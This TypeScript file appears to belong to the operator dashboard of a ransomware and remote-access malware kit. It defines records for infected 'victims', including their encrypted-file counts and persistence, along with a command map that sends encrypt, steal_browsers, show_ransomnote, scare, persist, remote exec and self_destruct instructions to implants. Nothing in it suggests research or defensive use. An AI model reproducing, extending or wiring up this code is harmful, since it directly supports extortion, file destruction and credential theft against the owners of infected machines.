import type { BackendVictimInfo, BackendLogEntry } from './hooks/useSocket';

export interface Victim {
  id: string;
  hostname: string;
  os: string;
  ip: string;
  agent: string;
  type: string;
  lastSeen: string;
  persistent: boolean;
  deployed: boolean;
  status: string;
  cpu?: string;
  ram?: string;
  riskScore: number;
  country: string;
  files_found?: number;
  files_encrypted?: number;
}

export interface LogEntry {
  id: string;
  timestamp: string;
  target: string;
  action: string;
  message: string;
  outputDetail?: string;
}

export const COMMAND_MAP: Record<string, string> = {
  encrypt: 'encrypt',
  decrypt: 'decrypt',
  exec: 'exec',
  execute: 'exec',
  terminal: '_terminal',
  persist: 'persist',
  download: 'download',
  upload: 'upload',
  netinfo: 'network_info',
  network_info: 'network_info',
  destroy: 'self_destruct',
  self_destruct: 'self_destruct',
  status: 'status',
  screenshot: 'screenshot',
  pslist: 'pslist',
  pskill: 'pskill',
  steal_browsers: 'steal_browsers',
  steal: 'steal_browsers',
  show_ransomnote: 'show_ransomnote',
  scare: 'scare',
};

export function mapBackendStatus(s: string): string {
  const map: Record<string, string> = {
    active: 'ONLINE',
    ok: 'ONLINE',
    online: 'ONLINE',
    encrypted: 'ENCRYPTED',
    watchdog: 'WATCHDOG',
    waiting: 'ONLINE',
    decrypted: 'ONLINE',
    error: 'OFFLINE',
    offline: 'OFFLINE',
    self_destructed: 'OFFLINE',
  };
  return map[s?.toLowerCase()] || s?.toUpperCase() || 'OFFLINE';
}

export function backendVictimToDashboard(
  hostname: string,
  info: BackendVictimInfo
): Victim {
  const d: Record<string, unknown> = info.data || {};
  return {
    id: hostname,
    hostname: (d.hostname as string) || hostname,
    os: (d.os as string) || (d.platform as string) || 'unknown',
    ip: (d.ip as string) || '0.0.0.0',
    agent: (d.agent as string) || '?',
    type: (d.type as string) || 'unknown',
    lastSeen: info.last_seen || 'never',
    persistent: !!d.persistent,
    deployed: !!d.deployed,
    status: mapBackendStatus((d.status as string) || 'unknown'),
    riskScore: 0,
    country: '──',
    files_found: d.files_found as number | undefined,
    files_encrypted: d.files_encrypted as number | undefined,
  };
}

let logIdCounter = 0;

export function backendLogToDashboard(
  entry: BackendLogEntry,
): LogEntry {
  return {
    id: `log-${logIdCounter++}`,
    timestamp: entry.timestamp || '',
    target: entry.hostname || '?',
    action: entry.command || 'info',
    message: entry.result || `Command: ${entry.command}`,
    outputDetail: entry.result || undefined,
  };
}
